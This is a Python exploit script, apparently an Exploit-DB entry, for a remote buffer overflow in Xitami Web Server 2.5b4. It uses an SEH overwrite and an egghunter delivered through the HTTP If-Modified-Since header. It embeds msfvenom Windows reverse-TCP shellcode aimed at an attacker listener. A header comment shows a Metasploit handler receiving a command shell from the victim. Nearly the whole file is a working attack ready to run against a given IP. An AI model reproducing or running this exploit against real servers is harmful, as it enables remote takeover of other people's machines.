# Exploit Title: Xitami Web Server 2.5 Remote Buffer Overflow (SEH + Egghunter)
# Date: May 4, 2019
# Author: ElSoufiane
# Version: 2.5b4
# Tested on: Windows Vista Ultimate (Build 6000) and Windows XP SP3 Professional
# Discovered by: Krystian Kloskowski
#
# Set up a multi handler listener in MSFConsole
# then run exploit
#
# root@f6c9fa91b403:~/XitamiWebServer# python exploit.py 192.168.1.149
# [+] Sending exploit payload...
#
# Check the MSFConsole listener
#
# msf5 exploit(multi/handler) > run
# [*] Started reverse TCP handler on 0.0.0.0:5801
# [*] Encoded stage with x86/shikata_ga_nai
# [*] Sending encoded stage (267 bytes) to 172.17.0.1
# [*] Command shell session 6 opened (172.17.0.2:5801 -> 172.17.0.1:39416) at 2019-05-04 00:17:55 +0000



# C:\Xitami>

import socket
import sys
import struct

if len(sys.argv) != 2 :
	print "[+] Usage : python exploit.py [VICTIM_IP]"
	exit(0)

TCP_IP = sys.argv[1]
TCP_PORT = 80


egg = "SOUFSOUF"
nops = "\x90"*10

#msfvenom -p windows/shell/reverse_tcp LPORT=5801 LHOST=192.168.1.129 -f python -v shellcode -e x86/alpha_mixed
shellcode =  b""
shellcode += b"\x89\xe2\xdb\xc5\xd9\x72\xf4\x59\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43"
shellcode += b"\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30"
shellcode += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
shellcode += b"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += b"\x42\x75\x4a\x49\x79\x6c\x49\x78\x6f\x72\x57"
shellcode += b"\x70\x53\x30\x33\x30\x35\x30\x6e\x69\x39\x75"
shellcode += b"\x74\x71\x79\x50\x72\x44\x6e\x6b\x32\x70\x34"
shellcode += b"\x70\x6c\x4b\x32\x72\x66\x6c\x6c\x4b\x66\x32"
shellcode += b"\x37\x64\x6c\x4b\x34\x32\x64\x68\x34\x4f\x4e"
shellcode += b"\x57\x33\x7a\x34\x66\x54\x71\x69\x6f\x4c\x6c"
shellcode += b"\x47\x4c\x30\x61\x53\x4c\x66\x62\x66\x4c\x71"
shellcode += b"\x30\x6a\x61\x58\x4f\x64\x4d\x55\x51\x38\x47"
shellcode += b"\x49\x72\x4c\x32\x73\x62\x33\x67\x6c\x4b\x32"
shellcode += b"\x72\x76\x70\x4c\x4b\x62\x6a\x45\x6c\x4e\x6b"
shellcode += b"\x30\x4c\x56\x71\x34\x38\x68\x63\x63\x78\x77"
shellcode += b"\x71\x4e\x31\x52\x71\x4c\x4b\x31\x49\x37\x50"
shellcode += b"\x75\x51\x49\x43\x4c\x4b\x73\x79\x37\x68\x6a"
shellcode += b"\x43\x67\x4a\x50\x49\x6c\x4b\x36\x54\x6e\x6b"
shellcode += b"\x75\x51\x4a\x76\x64\x71\x4b\x4f\x4c\x6c\x4f"
shellcode += b"\x31\x78\x4f\x64\x4d\x45\x51\x38\x47\x36\x58"
shellcode += b"\x6b\x50\x62\x55\x38\x76\x37\x73\x33\x4d\x6a"
shellcode += b"\x58\x65\x6b\x43\x4d\x47\x54\x72\x55\x79\x74"
shellcode += b"\x51\x48\x4e\x6b\x32\x78\x77\x54\x65\x51\x58"
shellcode += b"\x53\x50\x66\x6e\x6b\x66\x6c\x62\x6b\x6c\x4b"
shellcode += b"\x56\x38\x67\x6c\x47\x71\x4a\x73\x6c\x4b\x46"
shellcode += b"\x64\x6c\x4b\x36\x61\x6e\x30\x6e\x69\x32\x64"
shellcode += b"\x45\x74\x36\x44\x31\x4b\x31\x4b\x51\x71\x56"
shellcode += b"\x39\x51\x4a\x36\x31\x79\x6f\x69\x70\x61\x4f"
shellcode += b"\x71\x4f\x30\x5a\x6c\x4b\x56\x72\x6a\x4b\x4e"
shellcode += b"\x6d\x53\x6d\x35\x38\x67\x43\x54\x72\x65\x50"
shellcode += b"\x63\x30\x73\x58\x52\x57\x71\x63\x56\x52\x63"
shellcode += b"\x6f\x72\x74\x43\x58\x30\x4c\x52\x57\x36\x46"
shellcode += b"\x63\x37\x6d\x59\x5a\x48\x39\x6f\x48\x50\x48"
shellcode += b"\x38\x6c\x50\x43\x31\x65\x50\x45\x50\x55\x79"
shellcode += b"\x4a\x64\x53\x64\x46\x30\x45\x38\x31\x39\x4f"
shellcode += b"\x70\x52\x4b\x53\x30\x39\x6f\x6b\x65\x50\x6a"
shellcode += b"\x76\x6a\x75\x38\x49\x50\x6d\x78\x31\x6a\x72"
shellcode += b"\x4e\x62\x48\x76\x62\x35\x50\x42\x31\x53\x6c"
shellcode += b"\x6f\x79\x39\x76\x56\x30\x52\x70\x66\x30\x76"
shellcode += b"\x30\x57\x30\x46\x30\x77\x30\x56\x30\x32\x48"
shellcode += b"\x6b\x5a\x34\x4f\x69\x4f\x6d\x30\x39\x6f\x69"

egghunter ="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"+"SOUF"+"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

nseh_jmp = "\xeb\xaa"	#jmp back 84 bytes
seh = "\x87\x1d\x40"	# (xiwin32.exe) 0x00401d87 -> pop/pop/ret. ( Parial Overwrite )

payload = "\x90"*120
payload += egghunter
payload += "\x90"*(190-len(payload))
payload += nseh_jmp
payload += seh

http_req = "GET / HTTP/1.1\r\n"
http_req += "Host: "+ TCP_IP +"\r\n"
http_req += "User-Agent: "+egg+nops+shellcode+"\r\n"
http_req += "If-Modified-Since: Wed, " + payload + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
print "[+] Sending exploit payload..."
s.send(http_req)
s.close()
